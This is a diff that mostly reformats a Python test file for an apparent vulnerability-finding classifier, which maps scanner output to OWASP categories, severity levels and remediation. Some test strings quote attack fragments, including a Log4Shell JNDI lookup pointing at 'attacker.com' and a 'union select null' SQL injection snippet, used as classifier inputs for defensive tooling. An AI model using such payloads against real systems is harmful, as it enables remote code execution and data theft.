@@ -13,6 +13,7 @@ from airecon.proxy.agent.owasp import (
 
 # ── classify_owasp — keyword matching ────────────────────────────────────────
 
+
 def test_classify_sqli_by_keyword():
     tags = classify_owasp("SQL injection found in login form", [], "sqlmap")
     assert "owasp:A03:2021" in tags
@@ -24,7 +25,9 @@ def test_classify_xss_by_keyword():
 
 
 def test_classify_ssrf_by_keyword():
-    tags = classify_owasp("SSRF via Host header redirect to internal network", [], "execute")
+    tags = classify_owasp(
+        "SSRF via Host header redirect to internal network", [], "execute"
+    )
     assert "owasp:A10:2021" in tags
 
 
@@ -64,7 +67,9 @@ def test_classify_no_match_returns_empty():
 
 
 def test_classify_multiple_categories():
-    tags = classify_owasp("SQL injection CVE-2022-9999 found in parameter", [], "sqlmap")
+    tags = classify_owasp(
+        "SQL injection CVE-2022-9999 found in parameter", [], "sqlmap"
+    )
     assert "owasp:A03:2021" in tags
     assert "owasp:A06:2021" in tags
 
@@ -75,42 +80,57 @@ def test_classify_no_duplicate_tags():
 
 
 def test_classify_rce_keyword():
-    tags = classify_owasp("Remote code execution via deserialization gadget", [], "execute")
+    tags = classify_owasp(
+        "Remote code execution via deserialization gadget", [], "execute"
+    )
     assert "owasp:A03:2021" in tags
 
 
 def test_classify_log4shell():
-    tags = classify_owasp("log4shell confirmed via ${jndi:ldap://attacker.com}", [], "nuclei")
+    tags = classify_owasp(
+        "log4shell confirmed via ${jndi:ldap://attacker.com}", [], "nuclei"
+    )
     assert "owasp:A03:2021" in tags
     assert "owasp:A06:2021" in tags
 
 
 def test_classify_bola_api():
-    tags = classify_owasp("BOLA: cross-account access confirmed on /api/orders/456", [], "burp")
+    tags = classify_owasp(
+        "BOLA: cross-account access confirmed on /api/orders/456", [], "burp"
+    )
     assert "owasp:API1:2023" in tags
 
 
 def test_classify_mass_assignment():
-    tags = classify_owasp("Mass assignment vulnerability — is_admin field accepted", [], "ffuf")
+    tags = classify_owasp(
+        "Mass assignment vulnerability — is_admin field accepted", [], "ffuf"
+    )
     assert "owasp:API3:2023" in tags or "owasp:A01:2021" in tags
 
 
 def test_classify_bfla():
-    tags = classify_owasp("BFLA: admin API endpoint accessible with regular user token", [], "burp")
+    tags = classify_owasp(
+        "BFLA: admin API endpoint accessible with regular user token", [], "burp"
+    )
     assert "owasp:API5:2023" in tags
 
 
 # ── classify_owasp — negative keyword exclusion ───────────────────────────────
 
+
 def test_negative_keyword_suppresses_match_in_context():
     # "no sql injection found" — negative word in context should suppress
-    tags = classify_owasp("Scanner result: no sql injection found in parameter", [], "sqlmap")
+    tags = classify_owasp(
+        "Scanner result: no sql injection found in parameter", [], "sqlmap"
+    )
     assert "owasp:A03:2021" not in tags
 
 
 def test_negative_keyword_does_not_suppress_unrelated_match():
     # Negative for A03 but A10 (SSRF) is still valid
-    tags = classify_owasp("No sql injection found, but SSRF confirmed via metadata endpoint", [], "nuclei")
+    tags = classify_owasp(
+        "No sql injection found, but SSRF confirmed via metadata endpoint", [], "nuclei"
+    )
     assert "owasp:A03:2021" not in tags
     assert "owasp:A10:2021" in tags
 
@@ -121,24 +141,35 @@ def test_negative_keyword_patched_suppresses():
 
 
 def test_negative_keyword_not_vulnerable_suppresses():
-    tags = classify_owasp("Target not vulnerable to SSRF, internal requests blocked", [], "ffuf")
+    tags = classify_owasp(
+        "Target not vulnerable to SSRF, internal requests blocked", [], "ffuf"
+    )
     assert "owasp:A10:2021" not in tags
 
 
 def test_negative_keyword_far_from_match_does_not_suppress():
     # Negative word is 300+ chars away from the match — should NOT suppress
-    far_text = "SQL injection confirmed in login form. " + "x" * 300 + " Not relevant: patched elsewhere."
+    far_text = (
+        "SQL injection confirmed in login form. "
+        + "x" * 300
+        + " Not relevant: patched elsewhere."
+    )
     tags = classify_owasp(far_text, [], "sqlmap")
     assert "owasp:A03:2021" in tags
 
 
 def test_high_confidence_keyword_bypasses_negative():
     # High-confidence match should not be suppressed even with negative words nearby
-    tags = classify_owasp("union select null — not vulnerable to basic injection but confirmed", [], "sqlmap")
+    tags = classify_owasp(
+        "union select null — not vulnerable to basic injection but confirmed",
+        [],
+        "sqlmap",
+    )
     assert "owasp:A03:2021" in tags
 
 
 # ── severity_for_evidence ─────────────────────────────────────────────────────
+
 
 def test_severity_rce_is_critical():
     sev = severity_for_evidence("Remote code execution via RCE payload", [], 0.9)
@@ -177,13 +208,17 @@ def test_severity_clamps_minimum_at_1():
 
 
 def test_severity_clamps_maximum_at_5():
-    sev = severity_for_evidence("rce confirmed xss confirmed ssrf confirmed sqli confirmed", [], 0.99)
+    sev = severity_for_evidence(
+        "rce confirmed xss confirmed ssrf confirmed sqli confirmed", [], 0.99
+    )
     assert sev <= 5
 
 
 def test_severity_high_confidence_boosts():
     # "rce confirmed" is a high_confidence_keyword → should boost base_severity+1
-    sev_hc = severity_for_evidence("rce confirmed — command executed on target", [], 0.95)
+    sev_hc = severity_for_evidence(
+        "rce confirmed — command executed on target", [], 0.95
+    )
     sev_reg = severity_for_evidence("remote code execution possible", [], 0.95)
     assert sev_hc >= sev_reg
 
@@ -195,6 +230,7 @@ def test_severity_negative_no_false_positive():
 
 
 # ── owasp_label ───────────────────────────────────────────────────────────────
+
 
 def test_owasp_label_known():
     label = owasp_label("owasp:A03:2021")
@@ -214,6 +250,7 @@ def test_owasp_label_unknown_passthrough():
 
 # ── remediation_for_owasp ─────────────────────────────────────────────────────
 
+
 def test_remediation_returns_list():
     rem = remediation_for_owasp("owasp:A03:2021")
     assert isinstance(rem, list)
@@ -226,6 +263,7 @@ def test_remediation_unknown_returns_empty():
 
 
 # ── cwe_for_owasp ─────────────────────────────────────────────────────────────
+
 
 def test_cwe_returns_list():
     cwes = cwe_for_owasp("owasp:A03:2021")
@@ -240,26 +278,33 @@ def test_cwe_unknown_returns_empty():
 
 # ── severity_label ────────────────────────────────────────────────────────────
 
+
 def test_severity_label_5():
     assert severity_label(5) == "Critical"
+
 
 def test_severity_label_4():
     assert severity_label(4) == "High"
 
+
 def test_severity_label_3():
     assert severity_label(3) == "Medium"
+
 
 def test_severity_label_2():
     assert severity_label(2) == "Low"
 
+
 def test_severity_label_1():
     assert severity_label(1) == "Info"
+
 
 def test_severity_label_unknown():
     assert severity_label(0) == "Info"
 
 
 # ── evidence_risk_summary ─────────────────────────────────────────────────────
+
 
 def test_risk_summary_empty():
     result = evidence_risk_summary([])
